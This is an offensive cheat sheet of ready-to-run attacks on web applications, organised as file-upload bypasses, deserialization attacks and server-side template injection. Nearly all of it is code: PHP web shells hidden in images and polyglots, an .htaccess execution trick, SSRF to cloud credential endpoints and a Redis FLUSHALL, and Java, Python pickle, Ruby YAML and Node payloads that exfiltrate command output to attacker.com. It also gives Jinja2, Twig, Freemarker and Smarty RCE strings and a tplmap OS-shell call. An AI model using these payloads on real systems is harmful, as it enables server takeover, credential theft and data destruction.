# DEVIL DESERIALIZATION & FILE UPLOAD RCE v777

## ══════════════════════════════════════
## FILE UPLOAD RCE — 30+ BYPASSES
## ══════════════════════════════════════

### Bypass 1: MIME Type Spoofing
```bash
# Server checks Content-Type header only
curl -X POST "https://target.com/upload" \
  -F "file=@shell.php;type=image/jpeg" \
  -F "filename=shell.jpg"
```

### Bypass 2: Double Extension
```
shell.php.jpg → if server uses last extension: treated as jpg
shell.jpg.php → if server uses first extension: treated as jpg
shell.php%00.jpg → null byte truncation (PHP < 5.3.4)
shell.php\x00.jpg
```

### Bypass 3: PHP Alternative Extensions
```
.php .php3 .php4 .php5 .php7 .phtml .pht .phps .php.jpg .shtml
.phar  ← PHP archive, executes as PHP
.inc   ← sometimes executed as PHP
.module (Drupal)
```

### Bypass 4: Magic Bytes (File Signature Spoofing)
```python
# Add JPEG magic bytes before PHP payload
python3 -c "
with open('shell.php.jpg', 'wb') as f:
    f.write(b'\xff\xd8\xff\xe0')  # JPEG magic bytes
    f.write(b'<?php system(\$_GET[\"cmd\"]); ?>')
"
# OR: Use exiftool to embed PHP in image metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' real_image.jpg
mv real_image.jpg shell.php.jpg
```

### Bypass 5: Polyglot Files
```bash
# File that is both valid image AND valid PHP
# GIFAR: GIF + PHP
python3 -c "
with open('poly.gif', 'wb') as f:
    f.write(b'GIF89a')
    f.write(b'<?php system(\$_GET[\"c\"]); ?>')
"

# ZIP polyglot (also valid PHP phar)
zip poly.zip shell.php
mv poly.zip shell.phar

# PDF + PHP polyglot
python3 -c "
data = b'%PDF-1.4 ' + b'<?php system(\$_GET[\"cmd\"]); ?>'
open('poly.php.pdf','wb').write(data)
"
```

### Bypass 6: .htaccess Upload
```bash
# Upload .htaccess to make .jpg execute as PHP
echo "AddType application/x-httpd-php .jpg .jpeg .png .gif" > .htaccess
curl -X POST "https://target.com/upload" -F "file=@.htaccess"
# Then upload shell.jpg → executes as PHP
```

### Bypass 7: Blacklist Bypass via Case
```
shell.PHP shell.Php shell.PHp shell.pHp
shell.PHTML shell.Phtml
```

### Bypass 8: Bypass via Content-Disposition
```
Content-Disposition: form-data; name="file"; filename="shell.php "
Content-Disposition: form-data; name="file"; filename="shell.php."
Content-Disposition: form-data; name="file"; filename="shell.php%20"
Content-Disposition: form-data; name="file"; filename="shell.php%0a"
```

### Bypass 9: SVG XSS via Upload
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```

### Bypass 10: SSRF via File URL
```
# If server fetches URL to "download" file for upload:
file:///etc/passwd
http://169.254.169.254/latest/meta-data/iam/security-credentials/
gopher://127.0.0.1:6379/_FLUSHALL
```

### Automated File Upload Testing
```bash
# Upload Bypass tool
pip3 install upload-bypass --break-system-packages -q 2>/dev/null
upload-bypass -u "https://target.com/upload" \
  -f file_param \
  -b /opt/SecLists/Web-Shells/

# Manual with ffuf
ffuf -u "https://target.com/upload" \
  -X POST \
  -request-file upload_template.txt \
  -w /opt/SecLists/Fuzzing/extensions-skipfish.fuzz.txt \
  -mc 200 -t 20
```

---

## ══════════════════════════════════════
## DESERIALIZATION ATTACKS
## ══════════════════════════════════════

### Java Deserialization — Gadget Chains
```bash
# Tools
git clone https://github.com/frohoff/ysoserial /opt/ysoserial -q 2>/dev/null || true

# Generate payloads for common gadget chains
for chain in CommonsCollections1 CommonsCollections2 CommonsCollections3 \
             CommonsCollections4 CommonsCollections5 CommonsCollections6 \
             CommonsCollections7 Spring1 Spring2 Groovy1 Jdk7u21 \
             BeanShell1 Clojure MozillaRhino1; do
  java -jar /opt/ysoserial/ysoserial-all.jar $chain \
    "curl https://ATTACKER.COM/?c=\$(id)" > /tmp/deser_${chain}.bin 2>/dev/null
  echo "Chain: $chain → /tmp/deser_${chain}.bin"
done

# Send via HTTP (base64 encode if needed)
B64=$(base64 /tmp/deser_CommonsCollections1.bin)
curl -X POST "https://target.com/api/data" \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @/tmp/deser_CommonsCollections1.bin

# Or via ViewState parameter (ASP.NET)
# Or via serialized cookie (PHP, Python, Ruby)
```

### PHP Object Injection
```php
// Find classes with __wakeup(), __destruct(), __toString()
// Craft serialized object that executes code

// Example: if there's a Logger class that writes to file on destroy:
O:6:"Logger":2:{s:8:"filename";s:15:"/var/www/a.php";s:4:"data";s:29:"<?php system($_GET['c']); ?>";}

// URL encode and send:
// ?data=O%3A6%3A%22Logger%22%3A2%3A%7Bs%3A8%3A%22filename...
```

### Python Pickle RCE
```python
# Pickle deserialization = RCE
import pickle, base64, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl https://attacker.com/?x=$(id)',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(f"Payload (base64): {payload}")

# Test against target's pickle endpoint
import requests
requests.post("https://target.com/api/deserialize",
    data={"data": payload},
    cookies={"session": "YOUR_SESSION"})
```

### Ruby YAML Deserialization
```yaml
# Ruby's YAML.load() is dangerous
--- !ruby/object:Gem::Installer
  i: x
--- !ruby/object:Gem::SpecFetcher
  i: x
--- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
      io: &1 !ruby/object:Net::BufferedIO
        io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
        debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
            sets: !ruby/object:Net::WriteAdapter
              socket: !ruby/module 'Kernel'
              method_id: :system
            git_set: "id | curl -d @- https://attacker.com"
          method_id: :open_write
```

### Node.js Deserialization (node-serialize)
```javascript
// Exploit IIFE in serialized object
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://attacker.com/?x=$(id)',function(e,s,t){console.log(s);})}()"}
// base64 encode and send as cookie/parameter
```

### Detection — Finding Deserialization Points
```bash
# Java: look for rO0AB (base64 of 0xACED magic bytes)
# PHP: look for O:N:"ClassName"
# Python: look for base64 encoded gASV / \x80\x03
# .NET: look for AAEAAAD (base64 SOAP formatter)

# Grep responses:
curl -s https://target.com | grep -oE 'rO0AB[a-zA-Z0-9+/=]+|O:[0-9]+:"[a-zA-Z]+'
# Check cookies:
curl -sv https://target.com/ 2>&1 | grep 'Set-Cookie' | grep -iE 'rO0|gAS|AAEAA'
```

---

## ══════════════════════════════════════
## SSTI — SERVER-SIDE TEMPLATE INJECTION
## ══════════════════════════════════════

```bash
# Detection payloads (all engines)
SSTI_DETECT=("{{7*7}}" "${7*7}" "#{7*7}" "<%= 7*7 %>" "{{7*'7'}}" "{php}echo 7*7;{/php}")

# Engine identification:
# {{7*7}} = 49 → Jinja2 (Python) or Twig (PHP)
# {{7*'7'}} = 7777777 → Jinja2 | 49 → Twig
# ${7*7} = 49 → Freemarker (Java) or Smarty (PHP)
# #{7*7} = 49 → Pebble (Java)

# Jinja2 RCE (Python Flask/Django):
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# Twig (PHP) RCE:
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java) RCE:
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Smarty (PHP) RCE:
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

# Automated SSTI detection:
tplmap -u "https://target.com/search?q=*" --os-shell
```

**IMPACT: RCE on server | Bounty: $10,000–$200,000**
